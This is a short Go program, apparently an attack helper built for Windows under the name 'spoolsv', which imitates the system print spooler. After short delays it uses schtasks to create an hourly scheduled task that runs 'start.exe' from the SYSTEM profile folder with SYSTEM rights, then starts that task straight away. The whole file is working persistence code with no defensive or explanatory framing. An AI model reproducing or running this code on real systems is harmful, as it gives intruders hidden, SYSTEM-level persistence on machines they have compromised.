package main
import(
	"os/exec"
	"time"
	"fmt"
)

//Compile with: env GOOS=windows GOARCH=386 go build spoolsv.go

func main(){

	//adding delays because networking is not ready yet when this executes. 
	//a := exec.Command("ping", "-n" , "7", "127.0.0.1")
	//a.Start()
	fmt.Printf("Time Unix: %v\n", time.Now().Unix())
	time.Sleep(7 * time.Second)
	fmt.Printf("Time now %v\n", time.Now().Unix())
	
	c := exec.Command("schtasks", "/create", "/ru", "SYSTEM", "/tn","start", "/tr","c:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\start.exe", "/sc","hourly", "/f")
	c.Start()

        fmt.Printf("Time Unix: %v\n", time.Now().Unix())
        time.Sleep(5 * time.Second)
        fmt.Printf("Time now %v\n", time.Now().Unix())

	d := exec.Command("schtasks", "/run", "/tn","start","/I")
	d.Start()
}       
